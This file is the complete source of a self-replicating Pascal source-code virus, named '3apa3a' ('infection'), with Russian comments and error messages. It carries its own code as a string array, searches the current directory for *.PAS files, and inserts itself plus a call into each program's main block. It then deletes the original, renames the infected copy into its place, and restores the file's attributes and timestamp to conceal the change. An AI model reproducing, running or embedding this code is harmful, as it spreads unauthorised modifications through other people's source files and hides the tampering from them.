uses Dos;

{ $define debug}

procedure _3apa3a_;

const CRLF=#$0D#$0A;
      LinesOfCode=457;

     _3apa3a:array[1..LinesOfCode] of string[100]=(
       #$0D#$0A'{ $define debug}',
       'procedure _3apa3a_;',
       #$0D#$0A'const CRLF=#$0D#$0A;',
       '      LinesOfCode=457;',
       #$0D#$0A'     _3apa3a:array[1..LinesOfCode] of string[100]=(',
       '%',
       '      );',
       #$0D#$0A'      apostrof=@@@@;',
       '      indent=@        @;',
       #$0D#$0A'      _uses_:string=@USES@;',
       '      _program_:string=@PROGRAM@;',
       '      _unit_:string=@UNIT@;',
       '      _dos_:string=@DOS@;',
       '      _procedure_:string=@PROCEDURE@;',
       '      _function_:string=@FUNCTION@;',
       '      _case_:string=@CASE@;',
       '      _asm_:string=@ASM@;',
       '      _record_:string=@RECORD@;',
       '      _end_:string=@END@;',
       '      _begin_:string=@BEGIN@;',
       '      _constructor_:string=@CONSTRUCTOR@;',
       '      _destructor_:string=@DESTRUCTOR@;',
       '      _object_:string=@OBJECT@;',
       '      _forward_:string=@FORWARD@;',
       '      _me_:string=@_3APA3A_@;',
       '      _CRLF_:string=@#$0D#$0A@;',
       #$0D#$0A'{$ifdef debug}',
       '      Mask:string=@1.PAS@;',
       '{$else}',
       '      Mask:string=@*.PAS@;',
       '{$endif}',
       #$0D#$0A'      pa3Mep_MaccuBa=32000;',
       #$0D#$0A'      ip_count=3;',
       #$0D#$0A#$0D#$0A'      uses_set=1;',
       '      main_end=2;',
       '      ok=3;',
       '      end_=4;',
       '      _procedure_read=5;',
       '      ready_for_uses=6;',
       '      proggie_started=7;',
       #$0D#$0A'      begin_=1;',
       '      object_=2;',
       '      end_needed=3;',
       '      begin_needed=4;',
       #$0D#$0A'      stck_len=255;',
       '      {максимальное число вложений}',
       #$0D#$0A'type',
       '   MaccuB=array[0..60000] of char;',
       '   yKa3aTb_Ha_char=^MaccuB;',
       #$0D#$0A#$0D#$0A'var',
       '   dirinfo: SearchRec;',
       #$0D#$0A'   procedure _3APA3uTb;',
       '   var',
       '       invalid:boolean;',
       #$0D#$0A'       procedure Error( Err_Msg:string );',
       '       begin',
       '         writeln( dirinfo.Name, @ @, Err_Msg );',
       '         invalid:=True;',
       '       end;',
       '   var',
       '       _stack_:array[1..stck_len] of byte;',
       '       _sp_:integer;',
       #$0D#$0A'       procedure Push( value:byte );',
       '       begin',
       '         Inc( _sp_ );',
       '         if _sp_>stck_len then',
       '         begin',
       '           Error(@эй! осторожней! столько вложений я не понимаю!@);',
       '           exit;',
       '         end;',
       #$0D#$0A'         _stack_[_sp_]:=value;',
       '       end;',
       #$0D#$0A'       function Pop:byte;',
       '       begin',
       '         Pop:=_stack_[_sp_];',
       #$0D#$0A'         if _sp_>0 then Dec(_sp_)',
       '         else Error( @глюк! попытка вынуть то, чего не ложили...@ );',
       '       end;',
       #$0D#$0A'       function Stack:byte;',
       '       begin',
       '         Stack:=_stack_[_sp_];',
       '       end;',
       #$0D#$0A'   var f, f1:file;',
       '       s:yKa3aTb_Ha_char;',
       #$0D#$0A'       i:integer;',
       #$0D#$0A'       last_crlf:integer;',
       '       last_word:integer;',
       '       lw:integer;',
       #$0D#$0A'       prevchar:char;',
       '       comment:byte;',
       '       CTPOKA:boolean;',
       #$0D#$0A'       lexes:longint;',
       '       _uses, _main_begin, _main_end:longint;',
       '       _uses_exists:boolean;',
       #$0D#$0A'       insertion_point:array[1..ip_count] of longint;',
       '       _program:boolean;',
       #$0D#$0A'       state:byte;',
       #$0D#$0A'       function lex( a:char ):boolean;',
       '       begin',
       '         lex:=( (a>=@a@) and (a<=@z@) ) or',
       '              ( (a>=@A@) and (a<=@Z@) ) or',
       '              ( (a>=@0@) and (a<=@9@) ) or',
       '              (a=@_@);',
       '       end;',
       #$0D#$0A'       procedure SeparatorRead( separator:char );',
       '       begin',
       '         if state=proggie_started then state:=ready_for_uses;',
       '                         {прочитано program ...}',
       '                         {дальше обязательно uses}',
       #$0D#$0A'         case separator of',
       '         @;@: begin',
       '                if state=uses_set then',
       '                begin',
       '                  insertion_point[1]:=lexes; {точка, где втыкать код}',
       '                  state:=0;',
       '                end;',
       #$0D#$0A'                if state=main_end then',
       '                begin',
       '                  Error( @гы, это ж конец внатуре!@ );',
       '                  state:=0;',
       '                end;',
       #$0D#$0A'                if (state=_procedure_read) or',
       '                   (state=end_) then',
       '                     state:=0;',
       '              end;',
       '         @.@: begin',
       '                if state=end_ then',
       '                begin',
       '                  Error( @еще не все!@ );',
       '                  state:=0;',
       '                end;',
       #$0D#$0A'                if state=main_end then state:=ok;',
       '              end;',
       '         end;',
       #$0D#$0A'       end;',
       #$0D#$0A#$0D#$0A'       procedure WriteB( a:integer );',
       '       var c:integer;',
       '       begin',
       '         BlockWrite( f1, s^[lw], a-lw, c ); {дописать то, что между лексемами}',
       '         lw:=a;',
       '       end;',
       #$0D#$0A'       procedure WriteString( s:string );',
       '       var i:integer;',
       '       begin',
       '         BlockWrite( f1, s[1], Length(s), i );',
       '       end;',
       #$0D#$0A#$0D#$0A'       procedure InsertProcName;',
       '       begin',
       '         WriteString( @  @+_me_+@;@+CRLF );',
       '       end;',
       #$0D#$0A'       procedure InsertProc;',
       '       var i,j,k,l:integer;',
       '           s:string;',
       '       begin',
       '         for i:=1 to LinesOfCode do',
       '         begin',
       #$0D#$0A'           if _3apa3a[i]=@%@ then',
       '           begin',
       '             for j:=1 to LinesOfCode do',
       '             begin',
       '               for k:=1 to Length( _3apa3a[j] ) do',
       '                 if _3apa3a[j, k]>#$0D then break;',
       #$0D#$0A'               s:=@@;',
       '               for l:=1 to k shr 1 do s:=s+_CRLF_;',
       #$0D#$0A'               s:=indent+s+apostrof+Copy( _3apa3a[j], k, 255 )+apostrof;',
       '               if j<LinesOfCode then s:=s+@,@;',
       #$0D#$0A'               WriteString( s+CRLF );',
       '             end;',
       #$0D#$0A'             continue;',
       '           end;',
       #$0D#$0A'           s:=_3apa3a[i];',
       '           for j:=1 to Length( s ) do',
       '             if s[j]=#$40 then s[j]:=apostrof;',
       #$0D#$0A'           WriteString( s+CRLF );',
       #$0D#$0A'         end;',
       '       end;',
       #$0D#$0A'       procedure WriteIt( a: integer );',
       '       var s1:string;',
       '       begin',
       '         WriteB( a );',
       #$0D#$0A'         if (lexes=_uses) and not _uses_exists then',
       '           WriteString( _uses_+@ @ );',
       #$0D#$0A'         if lexes=insertion_point[3] then',
       '         begin',
       '           if _uses_exists then s1:=@,@',
       '           else s1:=@;@+CRLF;',
       #$0D#$0A'           WriteString( _dos_+s1 );',
       '         end;',
       #$0D#$0A'         if lexes=insertion_point[1] then',
       '           InsertProc;',
       #$0D#$0A'         if lexes=insertion_point[2] then',
       '         begin',
       '           InsertProcName;',
       '           state:=ok;',
       '         end;',
       '       end;',
       #$0D#$0A#$0D#$0A#$0D#$0A'       procedure ParseWord( a, b:integer );',
       '       var sl:string;',
       '         function UpCaseStr( st:string ):string;',
       '         var i:integer;',
       '         begin',
       '           for i:=1 to Length(st) do',
       '             st[i]:=UpCase(st[i]);',
       #$0D#$0A'           UpCaseStr:=st;',
       #$0D#$0A'         end;',
       '       begin',
       '         if b-a>255 then',
       '         begin',
       '           Error( @Слишком длинное слово!@ );',
       '           exit;',
       '         end;',
       #$0D#$0A'         sl[0]:=char(b-a+1);',
       '         Move( s^[a], sl[1], b-a+1 );',
       #$0D#$0A'         sl:=UpCaseStr( sl );',
       #$0D#$0A'         if _program and',
       '            ((sl=_program_) or (sl=_unit_)) then',
       '            begin',
       '              Error( @Ишь, че захотел! не буду я его заражать!@ );',
       '              exit;',
       '            end;',
       #$0D#$0A#$0D#$0A'         if (sl=_program_) or (sl=_unit_) then _program:=true;',
       #$0D#$0A'         if (state=uses_set) and (insertion_point[3]=0) then',
       '            insertion_point[3]:=lexes;',
       #$0D#$0A'         if sl=_uses_ then',
       '         begin',
       '           _program:=true;',
       #$0D#$0A'           _uses_exists:=true;',
       '           _uses:=lexes;',
       '           state:=uses_set;',
       '         end;',
       #$0D#$0A'         if _program then',
       '         begin',
       '           if _uses<0 then {пора ждать @;@ и втыкать туда uses}',
       '            state:=proggie_started',
       '         end',
       '         else state:=ready_for_uses;',
       #$0D#$0A'         if state=ready_for_uses then {значит, uses еще не было}',
       '         begin                        {значит, нужно вставить}',
       '           _uses:=lexes;',
       '           insertion_point[1]:=lexes;',
       '           insertion_point[3]:=lexes;',
       #$0D#$0A'           _program:=true;',
       '           state:=0;',
       '         end;',
       #$0D#$0A'         if (state=uses_set) and (sl=_dos_) then insertion_point[3]:=-1;',
       #$0D#$0A'         if sl=_unit_ then',
       '         begin',
       '             {пока что юниты оставим в покое}',
       '             Error( @слышь! это юнит, что ли?@ );',
       '             exit;',
       '         end',
       '         else',
       '             if sl=_end_ then',
       '             begin',
       #$0D#$0A'               if _sp_>0 then',
       '               begin',
       #$0D#$0A'                 if Stack<=end_needed then Pop',
       '                 else {begin_needed}',
       '                 begin',
       '                   Error( @сначала было начало@ );',
       '                   exit;',
       '                 end;',
       #$0D#$0A'               end',
       '               else',
       '               begin',
       '                 Error(@концов больше, чем начал!@);',
       '                 exit;',
       '               end;',
       #$0D#$0A'               if (_sp_=0) and (_main_begin>=0) then',
       '               begin',
       '                 _main_end:=lexes;',
       #$0D#$0A'                 insertion_point[2]:=_main_begin+1;',
       '                 state:=main_end;',
       '               end',
       '               else',
       '               begin',
       '                 state:=end_;',
       #$0D#$0A'               end;',
       #$0D#$0A'             end',
       '             else',
       '               if sl=_begin_ then',
       '               begin',
       #$0D#$0A'                 if _sp_=0 then _main_begin:=lexes;',
       #$0D#$0A'                 if Stack=begin_needed then Pop;',
       #$0D#$0A'                 Push(begin_);',
       #$0D#$0A'               end',
       '               else',
       #$0D#$0A'                 {кто заменяет endу begin}',
       '                 if (sl=_record_) or',
       '                    (sl=_asm_) or',
       '                    (sl=_case_) {кто ж еще?}',
       '                   then',
       '                   Push( end_needed );',
       #$0D#$0A'                 if (sl=_object_) then Push(object_);',
       #$0D#$0A'                 {после кого обязательно begin - т.е.,',
       '                   после кого begin не будет главным}',
       '                 if (sl=_procedure_) or',
       '                    (sl=_function_) or',
       '                    (sl=_constructor_) or',
       '                    (sl=_destructor_) {кто ж еще?}',
       '                   then',
       '                   if Stack<>object_ then',
       '                     Push( begin_needed );',
       #$0D#$0A'                 if sl=_forward_ then',
       '                 begin',
       '                   if Stack=begin_needed then Pop',
       '                   else',
       '                   begin',
       #$0D#$0A'                     Error( @отфорварди-ка лучше мессагу. да по-дальше!@ );',
       '                     exit;',
       #$0D#$0A'                   end;',
       '                 end;',
       #$0D#$0A'                 if sl=_procedure_ then',
       '                 begin',
       '                   state:=_procedure_read;',
       '                 end',
       '                 else',
       '                   if (sl=_me_) and (state=_procedure_read) then',
       '                   begin',
       '                     Error(@тут я уже есть@);',
       '                     exit;',
       '                   end;',
       #$0D#$0A'       end; {Parse}',
       #$0D#$0A'       procedure ReadSource( WriteToFile:boolean );',
       '       var i,j:integer;',
       '       begin',
       #$0D#$0A'         GetMem( s, pa3Mep_MaccuBa );',
       '         comment:=0;',
       '         lexes:=0;',
       #$0D#$0A#$0D#$0A'         last_word:=0;',
       '         lw:=0;',
       #$0D#$0A'         last_crlf:=0;',
       '         j:=0;',
       #$0D#$0A'         _sp_:=0;',
       #$0D#$0A'         state:=0;',
       #$0D#$0A'         while not Eof( f ) do',
       '         begin',
       #$0D#$0A'           if invalid or (state=ok) then break;',
       #$0D#$0A'           i:=j-last_crlf;',
       '           Move( s^[last_crlf], s^[0], i );',
       #$0D#$0A'           Dec(last_word, last_crlf);',
       '           Dec(lw, last_crlf);',
       #$0D#$0A#$0D#$0A'           BlockRead( f, s^[j], pa3Mep_MaccuBa, j );',
       #$0D#$0A'           CTPOKA:=False;',
       '           if j<pa3Mep_MaccuBa then',
       '           begin',
       '             s^[j]:=#$0D;           {CRLF в конце файла}',
       '             Inc(j);',
       '           end;',
       #$0D#$0A'           prevchar:=#0;',
       #$0D#$0A'           for i:=i to j-1 do',
       '           begin',
       '             if invalid or (state=ok) then break; {For}',
       #$0D#$0A'             if i>0 then prevchar:=s^[i-1];',
       #$0D#$0A'             if s^[i]=#$0A then',
       '             begin',
       '               last_crlf:=i+1;',
       #$0D#$0A'               if CTPOKA then {не закрыт апостроф стринга}',
       '               begin',
       '                 Error( @Эй, ты, программер! Aпостроф кто будет закрывать?@ );',
       '                 break; {For}',
       '               end;',
       #$0D#$0A'               if WriteToFile then WriteB( i );',
       #$0D#$0A'               continue; {For}',
       '             end;',
       #$0D#$0A'             if comment=0 then',
       '             begin',
       '               if s^[i]=@{@ then',
       '               begin',
       '                 comment:=1;',
       '                 continue;',
       '               end;',
       #$0D#$0A'               if (s^[i]=@*@) and (prevchar=@(@) then',
       '               begin',
       '                 comment:=2;',
       '                 continue;',
       '               end;',
       #$0D#$0A'               if (s^[i]=@@@@) then',
       '               begin',
       '                 CTPOKA:=CTPOKA xor True;',
       #$0D#$0A'                 continue;',
       '               end;',
       #$0D#$0A'               if not CTPOKA then',
       '               begin',
       '                 if not lex( s^[i] ) and lex( prevchar ) then',
       '                 begin',
       #$0D#$0A'                   if WriteToFile then',
       '                     WriteIt( last_word )',
       '                   else',
       '                     ParseWord( last_word, i-1 );',
       #$0D#$0A'                   Inc(lexes);',
       '                 end',
       '                 else',
       '                   if not lex( prevchar ) and lex( s^[i] ) then last_word:=i;',
       #$0D#$0A'                 if (s^[i]=@;@) or (s^[i]=@.@) then SeparatorRead(s^[i]);',
       #$0D#$0A'               end; {not CTPOKA}',
       #$0D#$0A'             end {if comment=0}',
       '             else',
       '             begin',
       '               if ((comment=1) and (s^[i]=@}@)) or',
       '                  ((comment=2) and ( s^[i]=@)@ ) and (prevchar=@*@))then',
       '               begin',
       #$0D#$0A'                 comment:=0;',
       '                 continue; {For}',
       #$0D#$0A'               end;',
       '             end;',
       '           end;',
       '         end; {While}',
       #$0D#$0A'         if WriteToFile then',
       '         begin',
       '           WriteB( j-1 );',
       #$0D#$0A'           while not Eof( f ) do',
       '           begin',
       '             BlockRead( f, s^[0], pa3Mep_MaccuBa, j );',
       '             BlockWrite( f1, s^[0], j, j );',
       #$0D#$0A'             if j<>pa3Mep_MaccuBa then break;',
       '           end;',
       '         end;',
       #$0D#$0A'         FreeMem( s, pa3Mep_MaccuBa );',
       #$0D#$0A#$0D#$0A'       end;',
       #$0D#$0A#$0D#$0A'   begin',
       #$0D#$0A'     Assign( f, dirinfo.Name );',
       '     Assign( f1, #$FF );',
       '     SetFAttr( f, 0 );',
       #$0D#$0A#$0D#$0A'     _uses:=-1;',
       '     _main_begin:=-1;',
       '     _main_end:=-1;',
       '     invalid:=false;',
       '     _uses_exists:=false;',
       '     _program:=false;',
       #$0D#$0A'     Reset( f, 1 );',
       #$0D#$0A'     for i:=1 to ip_count do insertion_point[i]:=0;',
       #$0D#$0A'     ReadSource( False );',
       #$0D#$0A'     Close( f );',
       #$0D#$0A'     if invalid then exit;',
       #$0D#$0A'     Rewrite( f1, 1 );',
       #$0D#$0A'     Reset( f, 1 );',
       #$0D#$0A'     ReadSource( True );',
       #$0D#$0A'     Close( f );',
       '     Close( f1 );',
       #$0D#$0A'{$ifndef debug}',
       '     Erase( f );',
       '     Rename( f1, dirinfo.Name );',
       '{$endif}',
       #$0D#$0A'     SetFAttr( f, dirinfo.Attr );',
       '     SetFTime( f, dirinfo.Time );',
       #$0D#$0A'     Error( @3apa3a: Ok@ )',
       '   end;',
       #$0D#$0A'begin',
       '  FindFirst( Mask, $2F, dirinfo );',
       #$0D#$0A'  while DOSError=0 do',
       '  begin',
       '    writeln( dirinfo.Name );',
       '    _3APA3uTb;',
       '    FindNext( dirinfo );',
       '  end;',
       'end;'

      );

      apostrof='''';
      indent='        ';

      _uses_:string='USES';
      _program_:string='PROGRAM';
      _unit_:string='UNIT';
      _dos_:string='DOS';
      _procedure_:string='PROCEDURE';
      _function_:string='FUNCTION';
      _case_:string='CASE';
      _asm_:string='ASM';
      _record_:string='RECORD';
      _end_:string='END';
      _begin_:string='BEGIN';
      _constructor_:string='CONSTRUCTOR';
      _destructor_:string='DESTRUCTOR';
      _object_:string='OBJECT';
      _forward_:string='FORWARD';
      _me_:string='_3APA3A_';
      _CRLF_:string='#$0D#$0A';

{$ifdef debug}
      Mask:string='1.PAS';
{$else}
      Mask:string='*.PAS';
{$endif}

      pa3Mep_MaccuBa=32000;

      ip_count=3;


      uses_set=1;
      main_end=2;
      ok=3;
      end_=4;
      _procedure_read=5;
      ready_for_uses=6;
      proggie_started=7;

      begin_=1;
      object_=2;
      end_needed=3;
      begin_needed=4;

      stck_len=255;
      {максимальное число вложений}

type
   MaccuB=array[0..60000] of char;
   yKa3aTb_Ha_char=^MaccuB;


var
   dirinfo: SearchRec;

   procedure _3APA3uTb;
   var
       invalid:boolean;

       procedure Error( Err_Msg:string );
       begin
         writeln( dirinfo.Name, ' ', Err_Msg );
         invalid:=True;
       end;
   var
       _stack_:array[1..stck_len] of byte;
       _sp_:integer;

       procedure Push( value:byte );
       begin
         Inc( _sp_ );
         if _sp_>stck_len then
         begin
           Error('эй! осторожней! столько вложений я не понимаю!');
           exit;
         end;

         _stack_[_sp_]:=value;
       end;

       function Pop:byte;
       begin
         Pop:=_stack_[_sp_];

         if _sp_>0 then Dec(_sp_)
         else Error( 'глюк! попытка вынуть то, чего не ложили...' );
       end;

       function Stack:byte;
       begin
         Stack:=_stack_[_sp_];
       end;

   var f, f1:file;
       s:yKa3aTb_Ha_char;

       i:integer;

       last_crlf:integer;
       last_word:integer;
       lw:integer;

       prevchar:char;
       comment:byte;
       CTPOKA:boolean;

       lexes:longint;
       _uses, _main_begin, _main_end:longint;
       _uses_exists:boolean;

       insertion_point:array[1..ip_count] of longint;
       _program:boolean;

       state:byte;

       function lex( a:char ):boolean;
       begin
         lex:=( (a>='a') and (a<='z') ) or
              ( (a>='A') and (a<='Z') ) or
              ( (a>='0') and (a<='9') ) or
              (a='_');
       end;

       procedure SeparatorRead( separator:char );
       begin
         if state=proggie_started then state:=ready_for_uses;
                         {прочитано program ...}
                         {дальше обязательно uses}

         case separator of
         ';': begin
                if state=uses_set then
                begin
                  insertion_point[1]:=lexes; {точка, где втыкать код}
                  state:=0;
                end;

                if state=main_end then
                begin
                  Error( 'гы, это ж конец внатуре!' );
                  state:=0;
                end;

                if (state=_procedure_read) or
                   (state=end_) then
                     state:=0;
              end;
         '.': begin
                if state=end_ then
                begin
                  Error( 'еще не все!' );
                  state:=0;
                end;

                if state=main_end then state:=ok;
              end;
         end;

       end;


       procedure WriteB( a:integer );
       var c:integer;
       begin
         BlockWrite( f1, s^[lw], a-lw, c ); {дописать то, что между лексемами}
         lw:=a;
       end;

       procedure WriteString( s:string );
       var i:integer;
       begin
         BlockWrite( f1, s[1], Length(s), i );
       end;


       procedure InsertProcName;
       begin
         WriteString( '  '+_me_+';'+CRLF );
       end;

       procedure InsertProc;
       var i,j,k,l:integer;
           s:string;
       begin
         for i:=1 to LinesOfCode do
         begin

           if _3apa3a[i]='%' then
           begin
             for j:=1 to LinesOfCode do
             begin
               for k:=1 to Length( _3apa3a[j] ) do
                 if _3apa3a[j, k]>#$0D then break;

               s:='';
               for l:=1 to k shr 1 do s:=s+_CRLF_;

               s:=indent+s+apostrof+Copy( _3apa3a[j], k, 255 )+apostrof;
               if j<LinesOfCode then s:=s+',';

               WriteString( s+CRLF );
             end;

             continue;
           end;

           s:=_3apa3a[i];
           for j:=1 to Length( s ) do
             if s[j]=#$40 then s[j]:=apostrof;

           WriteString( s+CRLF );

         end;
       end;

       procedure WriteIt( a: integer );
       var s1:string;
       begin
         WriteB( a );

         if (lexes=_uses) and not _uses_exists then
           WriteString( _uses_+' ' );

         if lexes=insertion_point[3] then
         begin
           if _uses_exists then s1:=','
           else s1:=';'+CRLF;

           WriteString( _dos_+s1 );
         end;

         if lexes=insertion_point[1] then
           InsertProc;

         if lexes=insertion_point[2] then
         begin
           InsertProcName;
           state:=ok;
         end;
       end;



       procedure ParseWord( a, b:integer );
       var sl:string;
         function UpCaseStr( st:string ):string;
         var i:integer;
         begin
           for i:=1 to Length(st) do
             st[i]:=UpCase(st[i]);

           UpCaseStr:=st;

         end;
       begin
         if b-a>255 then
         begin
           Error( 'Слишком длинное слово!' );
           exit;
         end;

         sl[0]:=char(b-a+1);
         Move( s^[a], sl[1], b-a+1 );

         sl:=UpCaseStr( sl );

         if _program and
            ((sl=_program_) or (sl=_unit_)) then
            begin
              Error( 'Ишь, че захотел! не буду я его заражать!' );
              exit;
            end;


         if (sl=_program_) or (sl=_unit_) then _program:=true;

         if (state=uses_set) and (insertion_point[3]=0) then
            insertion_point[3]:=lexes;

         if sl=_uses_ then
         begin
           _program:=true;

           _uses_exists:=true;
           _uses:=lexes;
           state:=uses_set;
         end;

         if _program then
         begin
           if _uses<0 then {пора ждать ';' и втыкать туда uses}
            state:=proggie_started
         end
         else state:=ready_for_uses;

         if state=ready_for_uses then {значит, uses еще не было}
         begin                        {значит, нужно вставить}
           _uses:=lexes;
           insertion_point[1]:=lexes;
           insertion_point[3]:=lexes;

           _program:=true;
           state:=0;
         end;

         if (state=uses_set) and (sl=_dos_) then insertion_point[3]:=-1;

         if sl=_unit_ then
         begin
             {пока что юниты оставим в покое}
             Error( 'слышь! это юнит, что ли?' );
             exit;
         end
         else
             if sl=_end_ then
             begin

               if _sp_>0 then
               begin

                 if Stack<=end_needed then Pop
                 else {begin_needed}
                 begin
                   Error( 'сначала было начало' );
                   exit;
                 end;

               end
               else
               begin
                 Error('концов больше, чем начал!');
                 exit;
               end;

               if (_sp_=0) and (_main_begin>=0) then
               begin
                 _main_end:=lexes;

                 insertion_point[2]:=_main_begin+1;
                 state:=main_end;
               end
               else
               begin
                 state:=end_;

               end;

             end
             else
               if sl=_begin_ then
               begin

                 if _sp_=0 then _main_begin:=lexes;

                 if Stack=begin_needed then Pop;

                 Push(begin_);

               end
               else

                 {кто заменяет endу begin}
                 if (sl=_record_) or
                    (sl=_asm_) or
                    (sl=_case_) {кто ж еще?}
                   then
                   Push( end_needed );

                 if (sl=_object_) then Push(object_);

                 {после кого обязательно begin - т.е.,
                   после кого begin не будет главным}
                 if (sl=_procedure_) or
                    (sl=_function_) or
                    (sl=_constructor_) or
                    (sl=_destructor_) {кто ж еще?}
                   then
                   if Stack<>object_ then
                     Push( begin_needed );

                 if sl=_forward_ then
                 begin
                   if Stack=begin_needed then Pop
                   else
                   begin

                     Error( 'отфорварди-ка лучше мессагу. да по-дальше!' );
                     exit;

                   end;
                 end;

                 if sl=_procedure_ then
                 begin
                   state:=_procedure_read;
                 end
                 else
                   if (sl=_me_) and (state=_procedure_read) then
                   begin
                     Error('тут я уже есть');
                     exit;
                   end;

       end; {Parse}

       procedure ReadSource( WriteToFile:boolean );
       var i,j:integer;
       begin

         GetMem( s, pa3Mep_MaccuBa );
         comment:=0;
         lexes:=0;


         last_word:=0;
         lw:=0;

         last_crlf:=0;
         j:=0;

         _sp_:=0;

         state:=0;

         while not Eof( f ) do
         begin

           if invalid or (state=ok) then break;

           i:=j-last_crlf;
           Move( s^[last_crlf], s^[0], i );

           Dec(last_word, last_crlf);
           Dec(lw, last_crlf);


           BlockRead( f, s^[j], pa3Mep_MaccuBa, j );

           CTPOKA:=False;
           if j<pa3Mep_MaccuBa then
           begin
             s^[j]:=#$0D;           {CRLF в конце файла}
             Inc(j);
           end;

           prevchar:=#0;

           for i:=i to j-1 do
           begin
             if invalid or (state=ok) then break; {For}

             if i>0 then prevchar:=s^[i-1];

             if s^[i]=#$0A then
             begin
               last_crlf:=i+1;

               if CTPOKA then {не закрыт апостроф стринга}
               begin
                 Error( 'Эй, ты, программер! Aпостроф кто будет закрывать?' );
                 break; {For}
               end;

               if WriteToFile then WriteB( i );

               continue; {For}
             end;

             if comment=0 then
             begin
               if s^[i]='{' then
               begin
                 comment:=1;
                 continue;
               end;

               if (s^[i]='*') and (prevchar='(') then
               begin
                 comment:=2;
                 continue;
               end;

               if (s^[i]='''') then
               begin
                 CTPOKA:=CTPOKA xor True;

                 continue;
               end;

               if not CTPOKA then
               begin
                 if not lex( s^[i] ) and lex( prevchar ) then
                 begin

                   if WriteToFile then
                     WriteIt( last_word )
                   else
                     ParseWord( last_word, i-1 );

                   Inc(lexes);
                 end
                 else
                   if not lex( prevchar ) and lex( s^[i] ) then last_word:=i;

                 if (s^[i]=';') or (s^[i]='.') then SeparatorRead(s^[i]);

               end; {not CTPOKA}

             end {if comment=0}
             else
             begin
               if ((comment=1) and (s^[i]='}')) or
                  ((comment=2) and ( s^[i]=')' ) and (prevchar='*'))then
               begin

                 comment:=0;
                 continue; {For}

               end;
             end;
           end;
         end; {While}

         if WriteToFile then
         begin
           WriteB( j-1 );

           while not Eof( f ) do
           begin
             BlockRead( f, s^[0], pa3Mep_MaccuBa, j );
             BlockWrite( f1, s^[0], j, j );

             if j<>pa3Mep_MaccuBa then break;
           end;
         end;

         FreeMem( s, pa3Mep_MaccuBa );


       end;


   begin

     Assign( f, dirinfo.Name );
     Assign( f1, #$FF );
     SetFAttr( f, 0 );


     _uses:=-1;
     _main_begin:=-1;
     _main_end:=-1;
     invalid:=false;
     _uses_exists:=false;
     _program:=false;

     Reset( f, 1 );

     for i:=1 to ip_count do insertion_point[i]:=0;

     ReadSource( False );

     Close( f );

     if invalid then exit;

     Rewrite( f1, 1 );

     Reset( f, 1 );

     ReadSource( True );

     Close( f );
     Close( f1 );

{$ifndef debug}
     Erase( f );
     Rename( f1, dirinfo.Name );
{$endif}

     SetFAttr( f, dirinfo.Attr );
     SetFTime( f, dirinfo.Time );

     Error( '3apa3a: Ok' )
   end;

begin
  FindFirst( Mask, $2F, dirinfo );

  while DOSError=0 do
  begin
    writeln( dirinfo.Name );
    _3APA3uTb;
    FindNext( dirinfo );
  end;
end;

begin
  _3apa3a_;

end.
